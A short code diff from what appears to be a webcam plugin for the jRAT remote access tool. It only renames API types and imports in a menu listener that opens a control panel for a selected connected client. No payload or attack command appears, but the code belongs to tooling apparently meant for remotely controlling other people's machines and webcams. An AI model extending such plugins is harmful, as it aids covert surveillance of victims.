@@ -8,16 +8,16 @@ import javax.swing.ImageIcon;
 import javax.swing.JFrame;
 
 import jrat.api.BaseControlPanel;
-import jrat.api.RATMenuItemActionListener;
-import jrat.api.RATObject;
+import jrat.api.Client;
+import jrat.api.ui.RATMenuItemActionListener;
 
 public class MenuListener implements RATMenuItemActionListener {
 
 	@Override
-	public void onClick(List<RATObject> servers) {
+	public void onClick(List<Client> servers) {
 		try {
 			if (servers.size() > 0) {
-				final RATObject server = servers.get(0);
+				final Client server = servers.get(0);
 				BaseControlPanel panel = null;
 						 
 				if (WebcamPlugin.entry.instances.containsKey(server.getIP())) {
